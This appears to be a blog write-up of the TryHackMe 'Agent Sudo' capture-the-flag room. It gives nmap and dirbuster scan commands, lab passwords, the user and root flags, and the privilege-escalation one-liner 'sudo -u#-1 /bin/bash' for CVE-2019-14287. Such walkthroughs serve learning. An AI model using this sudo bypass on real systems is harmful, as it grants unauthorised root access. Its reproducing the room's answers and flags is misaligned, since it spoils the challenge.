---
layout: post
title: Agent Sudo
date:  2025-06-14 23:00:00 +0530 
categories: [Tryhackme]
tags: [hacking, tryhackme, writeup,ctf, Agent_Sudo,sudo, apt, ssh, ftp] # TAG names should always be lowercase 
render_with_liquid: false
media_subpath: /images/Agent_Sudo/

---

# 🕵️‍♂️ Agent Sudo - 14 June 2k25

![TryHackMe Logo](THM.png)

![Agent Sudo](Agent_Sudo .png){: width="600" height="50" .shadow }

---

# 🕵️ Reconnaissance/ Enumerate  - Task 1

> **Username:** `chris`  
> **Login:** `chris`  
> **Password:** `crystal`

---

## 🔍 Nmap Scan

**Command:**
```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN fastscan.txt 10.10.5.56
```

![Nmap Scan Screenshot](nmap_scan.png)

---

## 📂 Directory Scan (Dirbuster)

**Command:**
```bash
dirbuster -u http://10.10.199.108/content/ -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

![Directory Scan Screenshot](directory_scan.png)

---

## ❓ Questions and Answers

| #  | Question                                   | Answer                  |
|----|--------------------------------------------|-------------------------|
| 1  | How many open ports?                       | `3`                     |
| 2  | How do you redirect yourself to a secret page? | `user-agent`        |
| 3  | What is the agent name?                    | `chris`                 |

---

## 🔑 Hash Cracking & Brute-Force Task - 2

| #  | Question                        | Answer           |
|----|---------------------------------|------------------|
| 4  | FTP password                    | `crystal`        |
| 5  | Zip file password               | `alien`          |
| 6  | Steg password                   | `Area51`         |
| 7  | Who is the other agent (full name)? | `james`      |
| 8  | SSH password                    | `hackerrules!`   |

---

## 🏁 Capture the User Flag Task - 3

![SSH FLAG](ssh_flag.png)

| #  | Question                         | Answer                              |
|----|----------------------------------|-------------------------------------|
| 9  | What is the user flag?           | `b03d975e8c92a7c04146cfa7a5a313c7`  |
| 10 | What is the incident of the photo called? |                                 |

---

## ⬆️ Privilege Escalation Task - 4

```bash
sudo -u#-1 /bin/bash
```

![SSH FLAGS](ssh_and_flags.png)

| #   | Question                                      | Answer                  |
|-----|-----------------------------------------------|-------------------------|
| 11  | CVE number for the escalation (Format: CVE-xxxx-xxxx) | `CVE-2019-14287` |
| 12  | What is the root flag?                        | `b53a02f55b57d4439e3341834d70c062` |
| 13  | (Bonus) Who is Agent R?                       | `DesKel`                |

---


## 🎉 Happy Hacking!

> *“The quieter you become, the more you are able to hear.”*  
> — **Agent Sudo**

<div align="center">
    <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
        <img src="https://media.giphy.com/media/102h4wsmCG2s12/giphy.gif" alt="Charlie Hunnam GIF" width="400"/>
    </a>
</div>

---
